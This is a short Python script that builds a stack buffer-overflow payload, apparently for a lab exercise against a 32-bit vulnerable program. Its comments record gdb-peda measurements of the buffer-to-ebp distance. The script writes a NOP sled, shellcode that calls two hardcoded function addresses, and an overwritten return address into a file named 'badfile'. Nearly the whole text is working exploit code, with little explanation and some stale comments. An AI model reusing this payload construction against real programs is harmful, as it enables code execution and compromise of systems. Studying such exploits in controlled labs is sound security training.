# gdb-peda$ p $ebp
# $1 = (void *) 0xffffcf68
# gdb-peda$ p &buffer 
# $2 = (char (*)[496]) 0xffffcd70
# gdb-peda$ p/d 0xcf68-0xcd70
# $3 = 504
import sys 
# 0x565562a2 0x56556286:

shellcode= ( 
"\xbb\xa2\x62\x55\x56" 
"\xff\xd3" 
"\x50" 
"\xbb\x86\x62\x55\x56" 
"\xff\xd3" 
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(1612)) 
# Put the shellcode at the end 
# start = 1064 - len(shellcode) 
# content[start:] = shellcode 
content[1300:1300+len(shellcode)] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffcf68 + 250

# for i in range(815-4*10,830, 4):
content[508:512] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

